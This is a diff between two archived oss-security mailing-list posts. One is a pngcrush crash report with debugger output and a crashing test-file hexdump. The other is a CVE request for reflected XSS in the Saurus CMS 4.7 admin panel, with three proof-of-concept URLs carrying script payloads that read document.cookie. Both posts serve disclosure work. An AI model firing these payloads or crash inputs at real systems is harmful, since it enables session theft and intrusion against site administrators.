@@ -1,194 +1,55 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/02/28/6
-Message-ID: <CANMVOuyFeA7z+LyzQ44MY8TCdDyw9_YRLcW35UguOhjre-6MwA@mail.gmail.com>
-Date: Sat, 28 Feb 2015 14:13:48 -0600
-From: Brian Carpenter <brian.carpenter@...il.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/01/28/8
+Message-ID: <CALH-=7wwFG69Z-6XHD-R0UsmHhQ7rj+FSWZmfzPayv6E1kbeUA@mail.gmail.com>
+Date: Wed, 28 Jan 2015 05:50:26 +0100
+From: Steffen Rösemann <steffen.roesemann1986@...il.com>
 To: oss-security@...ts.openwall.com
-Subject: CVE request: pngcrush 1.7.83 crash bug (most likely exploitable)
+Subject: CVE-Request -- Saurus CMS v.4.7 (Community Edition, released: 12.08.2014) -- Multiple reflecting XSS vulnerabilities
 Content-Type: text/plain; charset=utf-8
 
-Good afternoon, I found a crash bug in pngcrush that is most likely
-exploitable and wanted to get a CVE assignment for it. I've already been in
-contact with the pngcrush author and this bug has been fixed in pngcrush
-v1.7.84 (which was released today, no mention of this in the changelog
-though: http://sourceforge.net/p/pmt/news/2015/02/pngcrush-1784-released/).
+Hi Josh, Steve, vendors, list.
 
-It was found with AFL (http://lcamtuf.coredump.cx/afl) and I compiled
-pngcrush as follows:
+I found multiple reflecting XSS vulnerabilities in the administrative
+backend of the content management system Saurus CMS v. 4.7 (Community
+Edition, released: 12.08.2014).
 
-Edited Makefile to point to afl-gcc binary then ran AFL_HARDEN=1 make -j12.
+The parameters used in the following PHP files are prone to reflecting XSS
+attacks (including exploit examples):
 
-Command line: ./pngcrush -fix -force test203 /dev/null
+user_management.php (vulnerable parameter: "search"):
 
-Debian 7, Kernel 2.13-38+deb7u7, GCC 4.9.2, pngcrush 1.7.83, uses libpng
-1.6.16 and zlib 1.2.8
+http://
+{TARGET}/admin/user_management.php?tmpuser_search=1&tmpgroup_search=1&tmpsearch_subtree=1&search=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%3C!--&user_search=1&group_search=1&group_search=1&flt_role=&keepThis=true&id=&op=&keel=&group_id=1&view=overview_false&user_id=&user_prev_id=&user_next_id=
 
-Here is the Valgrind output:
- | pngcrush 1.7.83
- |    Copyright (C) 1998-2002, 2006-2015 Glenn Randers-Pehrson
- |    Portions copyright (C) 2005       Greg Roelofs
- | This is a free, open-source program.  Permission is irrevocably
- | granted to everyone to use this version of pngcrush without
- | payment of any fee.
- | Executable name is pngcrush
- | It was built with libpng version 1.6.16, and is
- | running with  libpng version 1.6.16 - December 22, 2014
+profile_data.php (vulnerable parameter: "data_search"):
 
-Reading 0000 chunk.
-==24444== Invalid write of size 1
-==24444==    at 0x440B4C: pngcrush_measure_idat (pngcrush.c:7407)
-==24444==    by 0x441674: measure_idats (pngcrush.c:7341)
-==24444==    by 0x4035CB: main (pngcrush.c:4302)
-==24444==  Address 0x7feffeadf is just below the stack ptr.  To suppress,
-use: --workaround-gcc296-bugs=yes
-==24444==
-==24444== Invalid write of size 1
-==24444==    at 0x440B4F: pngcrush_measure_idat (pngcrush.c:7407)
-==24444==    by 0x441674: measure_idats (pngcrush.c:7341)
-==24444==    by 0x4035CB: main (pngcrush.c:4302)
-==24444==  Address 0x7feffeade is just below the stack ptr.  To suppress,
-use: --workaround-gcc296-bugs=yes
-==24444==
-==24444== Invalid write of size 1
-==24444==    at 0x440B57: pngcrush_measure_idat (pngcrush.c:7407)
-==24444==    by 0x441674: measure_idats (pngcrush.c:7341)
-==24444==    by 0x4035CB: main (pngcrush.c:4302)
-==24444==  Address 0x7feffeadd is just below the stack ptr.  To suppress,
-use: --workaround-gcc296-bugs=yes
-==24444==
-==24444== Invalid write of size 1
-==24444==    at 0x440B5B: pngcrush_measure_idat (pngcrush.c:7407)
-==24444==    by 0x441674: measure_idats (pngcrush.c:7341)
-==24444==    by 0x4035CB: main (pngcrush.c:4302)
-==24444==  Address 0x7feffeadc is just below the stack ptr.  To suppress,
-use: --workaround-gcc296-bugs=yes
-==24444==
-==24444== Invalid write of size 1
-==24444==    at 0x440B5F: pngcrush_measure_idat (pngcrush.c:7407)
-==24444==    by 0x441674: measure_idats (pngcrush.c:7341)
-==24444==    by 0x4035CB: main (pngcrush.c:4302)
-==24444==  Address 0x7feffeadb is just below the stack ptr.  To suppress,
-use: --workaround-gcc296-bugs=yes
-==24444==
-==24444== Invalid write of size 1
-==24444==    at 0x440B63: pngcrush_measure_idat (pngcrush.c:7407)
-==24444==    by 0x441674: measure_idats (pngcrush.c:7341)
-==24444==    by 0x4035CB: main (pngcrush.c:4302)
-==24444==  Address 0x7feffeada is just below the stack ptr.  To suppress,
-use: --workaround-gcc296-bugs=yes
-==24444==
-==24444== Invalid write of size 1
-==24444==    at 0x440B67: pngcrush_measure_idat (pngcrush.c:7407)
-==24444==    by 0x441674: measure_idats (pngcrush.c:7341)
-==24444==    by 0x4035CB: main (pngcrush.c:4302)
-==24444==  Address 0x7feffead9 is just below the stack ptr.  To suppress,
-use: --workaround-gcc296-bugs=yes
-==24444==
-==24444== Invalid write of size 1
-==24444==    at 0x440B6B: pngcrush_measure_idat (pngcrush.c:7407)
-==24444==    by 0x441674: measure_idats (pngcrush.c:7341)
-==24444==    by 0x4035CB: main (pngcrush.c:4302)
-==24444==  Address 0x7feffead8 is just below the stack ptr.  To suppress,
-use: --workaround-gcc296-bugs=yes
-==24444==
-==24444==
-==24444== Process terminating with default action of signal 11 (SIGSEGV):
-dumping core
-==24444==  Access not within mapped region at address 0x7FEFFAFFF
-==24444==    at 0x440B4C: pngcrush_measure_idat (pngcrush.c:7407)
-==24444==    by 0x441674: measure_idats (pngcrush.c:7341)
-==24444==    by 0x4035CB: main (pngcrush.c:4302)
-==24444==  If you believe this happened as a result of a stack
-==24444==  overflow in your program's main thread (unlikely but
-==24444==  possible), you can try to increase the size of the
-==24444==  main thread stack using the --main-stacksize= flag.
-==24444==  The main thread stack size used in this run was 8388608.
-Segmentation fault
+http://
+{TARGET}/admin/profile_data.php?data_search=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%3C!--&profile_search=&profile_id=0
 
-Here is the GDB output:
- | pngcrush 1.7.83
- |    Copyright (C) 1998-2002, 2006-2015 Glenn Randers-Pehrson
- |    Portions copyright (C) 2005       Greg Roelofs
- | This is a free, open-source program.  Permission is irrevocably
- | granted to everyone to use this version of pngcrush without
- | payment of any fee.
- | Executable name is pngcrush
- | It was built with libpng version 1.6.16, and is
- | running with  libpng version 1.6.16 - December 22, 2014
+error_log.php (vulnerable parameter: "filter"):
 
- |    Copyright (C) 1998-2004, 2006-2015 Glenn Randers-Pehrson,
- |    Copyright (C) 1996, 1997 Andreas Dilger,
- |    Copyright (C) 1995, Guy Eric Schalnat, Group 42 Inc.,
- | and zlib version 1.2.8, Copyright (C) 1995-2013,
- |    Jean-loup Gailly and Mark Adler.
- | It was compiled with gcc version 4.9.2.
+http://
+{TARGET}/admin/error_log.php?id=&op=&keel=&group_id=1&otsi=1&page=&filter=bla&algus=31.12.2014&lopp=07.01.2015&err_type=&otsi=1&page=&filter=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E%3C!--&algus=31.12.2014&lopp=07.01.2015&err_type=
 
-Reading 0000 chunk.
+Vendor patched this vulnerability in the latest commit of Saurus CMS v. 4.7
+(CE, released: 27.01.2015).
 
-Program received signal SIGSEGV, Segmentation fault.
-[----------------------------------registers-----------------------------------]
-RAX: 0x7fffffffccfb --> 0xffffff00007fff00
-RBX: 0x78d250 --> 0x0
-RCX: 0x7fffff7fefff
-RDX: 0x3
-RSI: 0x17
-RDI: 0xffffffffff80231f
-RBP: 0x0
-RSP: 0x7fffffffcc80 --> 0x0
-RIP: 0x440b4c (<pngcrush_measure_idat+13388>: mov    BYTE PTR [rcx],0x0)
-R8 : 0x78d010 --> 0xfbad2488
-R9 : 0x7fffffffcce0 --> 0x0
-R10: 0x0
-R11: 0x7ffff78bf3d0 (<__fread_chk>: mov    QWORD PTR [rsp-0x10],r12)
-R12: 0x7fffffffcce0 --> 0x0
-R13: 0x1
-R14: 0x7fffffffe622 ("test203-min")
-R15: 0x7fffffffe62e ("/dev/null")
-EFLAGS: 0x10217 (CARRY PARITY ADJUST zero sign trap INTERRUPT direction
-overflow)
-[-------------------------------------code-------------------------------------]
-   0x440b3b <pngcrush_measure_idat+13371>: mov    rcx,QWORD PTR [rsp+0x8]
-   0x440b40 <pngcrush_measure_idat+13376>: mov    rdx,QWORD PTR [rsp]
-   0x440b44 <pngcrush_measure_idat+13380>: lea    rsp,[rsp+0x98]
-=> 0x440b4c <pngcrush_measure_idat+13388>: mov    BYTE PTR [rcx],0x0
-   0x440b4f <pngcrush_measure_idat+13391>: mov    BYTE PTR [rcx-0x1],0x0
-   0x440b53 <pngcrush_measure_idat+13395>: sub    rcx,0x8
-   0x440b57 <pngcrush_measure_idat+13399>: mov    BYTE PTR [rcx+0x6],0x0
-   0x440b5b <pngcrush_measure_idat+13403>: mov    BYTE PTR [rcx+0x5],0x0
-[------------------------------------stack-------------------------------------]
-0000| 0x7fffffffcc80 --> 0x0
-0008| 0x7fffffffcc88 --> 0x0
-0016| 0x7fffffffcc90 --> 0x0
-0024| 0x7fffffffcc98 --> 0x0
-0032| 0x7fffffffcca0 --> 0x0
-0040| 0x7fffffffcca8 --> 0x0
-0048| 0x7fffffffccb0 --> 0x0
-0056| 0x7fffffffccb8 --> 0x0
-[------------------------------------------------------------------------------]
-Legend: code, data, rodata, value
-Stopped reason: SIGSEGV
-pngcrush_measure_idat () at pngcrush.c:7407
-7407                 buff[ib] = 0;
-gdb-peda$ exploit
-Description: Access violation on destination operand
-Short description: DestAv (8/22)
-Hash: 261ee37f9396108d2dafcfd615209cb5.261ee37f9396108d2dafcfd615209cb5
-Exploitability Classification: EXPLOITABLE
-Explanation: The target crashed on an access violation at an address
-matching the destination operand of the instruction. This likely indicates
-a write access violation, which means the attacker may control the write
-address and/or value.
-Other tags: AccessViolation (21/22)
+Could you please assign a CVE-ID for this?
 
-I've attached the test case but here is a hexdump:
-0000000 4d8a 474e 0a0d 0a1a 0000 0000 3030 3030
-0000010
+Thank you very much!
 
-Regards,
+Greetings from Germany.
 
-Brian 'geeknik' Carpenter
-https://twitter.com/geeknik
+Steffen Rösemann
 
-Content of type "text/html" skipped
+References:
 
-Download attachment "test203.gz" of type "application/x-gzip" (41 bytes)
+[1] http://www.saurus.info
+[2] https://github.com/sauruscms/Saurus-CMS-Community-Edition/issues/61
+[3] http://sroesemann.blogspot.de/2015/01/sroeadv-2015-05.html
+[4]
+https://github.com/sauruscms/Saurus-CMS-Community-Edition/commit/8dec044d0fdabcb9b04e58037623385a97b0d288
+[5]
+http://sroesemann.blogspot.de/2015/01/report-for-advisory-sroeadv-2015-05.html
+[6] http://seclists.org/fulldisclosure/2015/Jan/112
+
